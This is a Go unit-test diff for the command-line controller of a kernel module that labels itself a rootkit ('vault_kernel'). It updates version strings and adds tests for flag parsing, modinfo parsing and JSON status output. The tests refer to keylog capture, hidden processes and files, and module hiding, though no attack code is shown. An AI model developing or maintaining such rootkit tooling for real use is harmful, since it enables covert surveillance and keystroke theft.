@@ -14,7 +14,7 @@ import (
 func TestMarshalStatsJSON(t *testing.T) {
 	raw := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.9",
+		"version":         "3.10",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -42,7 +42,7 @@ func TestMarshalStatsJSON(t *testing.T) {
 			t.Errorf("%s should marshal as a number, got %T (%v)", k, out[k], out[k])
 		}
 	}
-	if out["module"] != "vault_kernel" || out["version"] != "3.9" {
+	if out["module"] != "vault_kernel" || out["version"] != "3.10" {
 		t.Errorf("string values mangled: module=%v version=%v", out["module"], out["version"])
 	}
 }
@@ -373,7 +373,7 @@ func TestKeylogSink(t *testing.T) {
 func TestBuildCaptureReport(t *testing.T) {
 	raw := map[string]string{
 		"module":          "vault_kernel",
-		"version":         "3.9",
+		"version":         "3.10",
 		"hooks_installed": "7",
 		"hooks_planned":   "7",
 		"module_hidden":   "0",
@@ -399,7 +399,7 @@ func TestBuildCaptureReport(t *testing.T) {
 	if rep.ModuleInSysfs {
 		t.Errorf("module_in_sysfs = true, want false")
 	}
-	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.9" {
+	if rep.Stats["hooks_installed"].(int) != 7 || rep.Stats["version"] != "3.10" {
 		t.Errorf("stats conversion wrong: %v", rep.Stats)
 	}
 	if len(rep.Hidden.PIDs) != 1 || rep.Hidden.Files[0] != "secret.txt" {
@@ -589,5 +589,152 @@ func TestParseMagicEncodeArgs(t *testing.T) {
 		if _, _, err := parseMagicEncodeArgs(bad); err == nil {
 			t.Errorf("parseMagicEncodeArgs(%v) must error", bad)
 		}
+	}
+}
+
+// parseWatchArgs v3.10: --once joins the grammar in any position and
+// combines freely with --interval; unknown tokens keep erroring.
+func TestParseWatchArgsOnce(t *testing.T) {
+	opts, err := parseWatchArgs([]string{"--once"})
+	if err != nil || !opts.once || opts.intervalMs != watchDefaultIntervalMs {
+		t.Errorf("--once: got %+v, %v", opts, err)
+	}
+	opts, err = parseWatchArgs([]string{"--interval", "250", "--once"})
+	if err != nil || !opts.once || opts.intervalMs != 250 {
+		t.Errorf("--interval 250 --once: got %+v, %v", opts, err)
+	}
+	opts, err = parseWatchArgs([]string{"--once", "--interval", "250"})
+	if err != nil || !opts.once || opts.intervalMs != 250 {
+		t.Errorf("--once --interval 250: got %+v, %v", opts, err)
+	}
+	for _, bad := range [][]string{
+		{"--once", "extra"},
+		{"--once", "--json"},
+	} {
+		if _, err := parseWatchArgs(bad); err == nil {
+			t.Errorf("parseWatchArgs(%v) must error", bad)
+		}
+	}
+}
+
+// parseModinfo: exact keys, first occurrence wins, empty values
+// skipped, case-insensitive; nil when no contract key appeared.
+func TestParseModinfo(t *testing.T) {
+	out := "filename:       /lib/modules/6.1.0/vault_kernel.ko\n" +
+		"srcversion:     ABC123\n" +
+		"version:        3.10\n" +
+		"author:         ruby570bocadito\n" +
+		"description:    vault_kernel kernel rootkit\n" +
+		"license:        GPL\n"
+	mi := parseModinfo(out)
+	if mi == nil {
+		t.Fatalf("parseModinfo returned nil for a complete output")
+	}
+	if mi.Filename != "/lib/modules/6.1.0/vault_kernel.ko" ||
+		mi.Version != "3.10" || mi.Author != "ruby570bocadito" ||
+		mi.Description != "vault_kernel kernel rootkit" {
+		t.Errorf("fields mangled: %+v", mi)
+	}
+	// srcversion/license must NOT leak into the section.
+	j, err := json.Marshal(mi)
+	if err != nil {
+		t.Fatalf("marshal: %v", err)
+	}
+	if strings.Contains(string(j), "srcversion") || strings.Contains(string(j), "GPL") {
+		t.Errorf("non-contract keys leaked: %s", j)
+	}
+
+	// Subset: only version present.
+	mi = parseModinfo("version:  3.10\nlicense: GPL\n")
+	if mi == nil || mi.Version != "3.10" || mi.Author != "" {
+		t.Errorf("subset parse: %+v (want version only)", mi)
+	}
+
+	// Empty/unknown keys -> nil (section omitted).
+	if mi := parseModinfo("license: GPL\nvermagic: 6.1.0\n"); mi != nil {
+		t.Errorf("no contract keys: want nil, got %+v", mi)
+	}
+	if mi := parseModinfo(""); mi != nil {
+		t.Errorf("empty output: want nil, got %+v", mi)
+	}
+
+	// Empty value for a contract key is skipped; first occurrence wins.
+	mi = parseModinfo("version:\nversion: 3.10\n")
+	if mi == nil || mi.Version != "3.10" {
+		t.Errorf("empty-value handling: %+v", mi)
+	}
+}
+
+// buildStatusReport pins the 5th JSON envelope: schema/device_present/
+// module_in_sysfs always present, modinfo omitted (omitempty) when the
+// modinfo probe did not run or found nothing.
+func TestBuildStatusReport(t *testing.T) {
+	mi := &modinfoInfo{Filename: "/x/vault_kernel.ko", Version: "3.10"}
+	rep := buildStatusReport(true, false, mi)
+	if rep.Schema != jsonSchemaVersion || !rep.DevicePresent || rep.ModuleInSysfs {
+		t.Errorf("scalar fields wrong: %+v", rep)
+	}
+	j, err := json.MarshalIndent(rep, "", "  ")
+	if err != nil {
+		t.Fatalf("marshal: %v", err)
+	}
+	var out map[string]interface{}
+	if err := json.Unmarshal(j, &out); err != nil {
+		t.Fatalf("invalid JSON: %v\n%s", err, j)
+	}
+	if out["schema"].(float64) != 1 || out["device_present"] != true ||
+		out["module_in_sysfs"] != false {
+		t.Errorf("envelope wrong: %s", j)
+	}
+	if _, ok := out["modinfo"].(map[string]interface{}); !ok {
+		t.Errorf("modinfo section missing: %s", j)
+	}
+
+	// No modinfo probe: the key vanishes (never null).
+	j, _ = json.Marshal(buildStatusReport(false, false, nil))
+	out = map[string]interface{}{}
+	json.Unmarshal(j, &out)
+	if _, ok := out["modinfo"]; ok {
+		t.Errorf("modinfo must be omitted without probe: %s", j)
+	}
+}
+
+// v3.10: flag operands starting with '-' are a MISSING operand, never
+// a file called "--follow" or "-foo" — parity with argparse, which
+// rejects the same input with "expected one argument".
+func TestFlagValuesRejectLeadingDash(t *testing.T) {
+	for _, bad := range [][]string{
+		{"--output", "--follow"},
+		{"--output", "-foo"},
+		{"--output", "--"},
+		{"--follow", "--output", "-x"},
+	} {
+		if _, err := parseKeylogArgs(bad); err == nil {
+			t.Errorf("parseKeylogArgs(%v) must reject a dash-prefixed FILE", bad)
+		}
+	}
+	for _, bad := range [][]string{
+		{"--out", "--json"},
+		{"--out", "-x"},
+		{"--out", "--"},
+	} {
+		if _, err := parseCaptureArgs(bad); err == nil {
+			t.Errorf("parseCaptureArgs(%v) must reject a dash-prefixed FILE", bad)
+		}
+	}
+	// The error names the offending token (no silent eating).
+	_, err := parseCaptureArgs([]string{"--out", "--json"})
+	if err != nil && !strings.Contains(err.Error(), "--json") {
+		t.Errorf("error must name the offending token, got: %v", err)
+	}
+	// A dash INSIDE the path (not leading) stays valid.
+	opts, err := parseKeylogArgs([]string{"--output", "cap-1.log"})
+	if err != nil || opts.outputPath != "cap-1.log" {
+		t.Errorf("normal path mangled: %+v, %v", opts, err)
+	}
+	// The documented escape works: ./-foo is a real path.
+	opts, err = parseKeylogArgs([]string{"--output", "./-foo"})
+	if err != nil || opts.outputPath != "./-foo" {
+		t.Errorf("./- escape mangled: %+v, %v", opts, err)
 	}
 }
